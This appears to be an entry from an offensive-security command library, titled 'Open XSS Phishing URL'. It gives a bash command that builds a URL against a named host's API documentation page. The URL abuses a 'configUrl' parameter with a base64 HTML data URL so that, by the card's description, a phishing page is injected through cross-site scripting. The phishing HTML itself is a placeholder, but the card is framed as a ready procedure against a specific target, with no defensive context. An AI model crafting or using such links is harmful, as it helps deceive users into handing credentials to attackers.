---
data: >-
  echo
  'https://jamfpro.shopifycloud.com/classicapi/doc/?configUrl=data:text/html;base64,encoded-phishing-payload'
tags:
  - xss
  - phishing
type: command
executor: bash
platforms:
  - Web
id: a85790e2-2a9a-49d1-8cf4-026e5aeebebb
created_at: '2025-12-13T23:56:20.462Z'
updated_at: '2025-12-13T23:56:20.462Z'
verified: false
validated: true
submitted: true
---
# Open XSS Phishing URL

## Command

```bash
echo 'https://jamfpro.shopifycloud.com/classicapi/doc/?configUrl=data:text/html;base64,encoded-phishing-payload'
```

## Description

Outputs a URL that injects a phishing page via XSS.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `configUrl` | Data URL with base64 phishing HTML | Yes |

## Examples

### Basic Usage

```bash
echo 'https://jamfpro.shopifycloud.com/classicapi/doc/?configUrl=data:text/html;base64,encoded-phishing-html'
```

## Expected Output

URL that renders phishing page when opened.

## Related

- [[procedures/Craft-XSS-Payload-for-Phishing]]
